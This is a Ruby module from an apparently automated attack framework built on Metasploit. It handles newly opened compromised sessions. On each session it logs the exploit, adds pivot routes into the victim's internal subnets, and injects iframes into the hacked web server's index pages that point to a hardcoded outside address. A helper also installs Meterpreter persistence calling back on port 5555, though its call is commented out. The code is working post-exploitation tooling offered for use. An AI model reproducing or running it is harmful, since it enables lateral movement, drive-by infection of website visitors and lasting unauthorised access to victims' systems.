require "#{RAILS_ROOT}/script/worker/webServerIFrameInjection"

module FIDIUS
module Session

  class MsfSessionEvent
    include ::Msf::SessionEvent

    def on_session_open(session)
      puts("on_session_open #{session}")
      FIDIUS::Session::add_session_to_db session
      FIDIUS::Session::session_action session
    end

    def on_session_close(session, reason='')
      puts("on_session_close #{session}")
    end

    def on_session_command(session, command)
      puts("on_session_command #{session} #{command}")
    end
  end

  def self.add_session_to_db session
    if session.framework.db.active
      session.framework.db.sync

      address = get_lhost session

      # Since we got a session, we know the host is vulnerable to something.
      # If the exploit used was multi/handler, though, we don't know what
      # it's vulnerable to, so it isn't really useful to save it.
      if not session.via_exploit or session.via_exploit == "exploit/multi/handler"
        wspace = session.framework.db.find_workspace(session.workspace)
        host = wspace.hosts.find_by_address(address)
        return unless host
        port = session.exploit_datastore["RPORT"]
        service = (port ? host.services.find_by_port(port) : nil)
        mod = session.framework.modules.create(session.via_exploit)
        vuln_info = {
          :host => host.address,
          :name => session.via_exploit,
          :refs => mod.references,
          :workspace => wspace
        }
        session.framework.db.report_vuln(vuln_info)
        # Exploit info is like vuln info, except it's /just/ for storing
        # successful exploits in an unserialized way. Yes, there is
        # duplication, but it makes exporting a score card about a
        # million times easier. TODO: See if vuln/exploit can get fixed up
        # to one useful table.
        exploit_info = {
          :name => session.via_exploit,
          :payload => session.via_payload,
          :workspace => wspace,
          :host => host,
          :service => service,
          :session_uuid => session.uuid
        }
        ret = session.framework.db.report_exploit(exploit_info)
      end
    end
  end

  def self.session_action session
    begin
      session.load_stdapi
      add_route_to_session session
      #TODO Reco
      #FIXME: get the local address of the interface the webautopwn is running on.
      webserver_iframe = FIDIUS::WebserverIFrameInjection.new session, "http://134.102.16.120:8080/"
      webserver_iframe.localizeIndexFiles
#      install_meterpreter session
    rescue ::Exception
      puts "problem in session_action: #{$!} #{$!.backtrace}"
    end
  end

  def self.install_meterpreter session
    script_path = Msf::Sessions::Meterpreter.find_script_path("persistence")
    rhost = FIDIUS::Session::get_rhost session
    lhost = Rex::Socket.source_address((rhost != nil and !rhost.empty?) ? rhost : "1.2.3.4");
    args = ['-X', '-p', '5555', '-r', lhost]
    puts "run: #{script_path} #{args}"
    session.execute_file(script_path, args)
  end

  def self.add_route_to_session session
    sb = Rex::Socket::SwitchBoard.instance
    session.net.config.each_route do |route|
      # Remove multicast and loopback interfaces
      next if route.subnet =~ /^(224\.|127\.)/
      next if route.subnet == '0.0.0.0'
      next if route.netmask == '255.255.255.255'
      next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new(FIDIUS::Session::get_rhost session)
      unless sb.route_exists?(route.subnet, route.netmask)
        puts "AutoAddRoute: Routing new subnet #{route.subnet}/#{route.netmask} through session #{session.sid}"
        sb.add_route(route.subnet, route.netmask, session)
      end
    end
  end


  def self.get_lhost session
    address = nil

    if session.respond_to? :peerhost and session.peerhost.to_s.length > 0
      address = session.peerhost
    elsif session.respond_to? :tunnel_peer and session.tunnel_peer.to_s.length > 0
      address = session.tunnel_peer[0, session.tunnel_peer.rindex(":") || session.tunnel_peer.length ]
    elsif session.respond_to? :target_host and session.target_host.to_s.length > 0
      address = session.target_host
    else
      elog("Session with no peerhost/tunnel_peer")
      dlog("#{session.inspect}", LEV_3)
      return
    end
  end

  def self.get_rhost session
    if session.respond_to? :target_host and session.target_host.to_s.length > 0
      return session.target_host
    elsif session.respond_to? :tunnel_local and session.tunnel_local.to_s.length > 0
      return session.tunnel_local[0, session.tunnel_local.rindex(":") || session.tunnel_local.length ]
    else
      puts("Session with no target_host or tunnel_local")
      return
    end
  end

end end
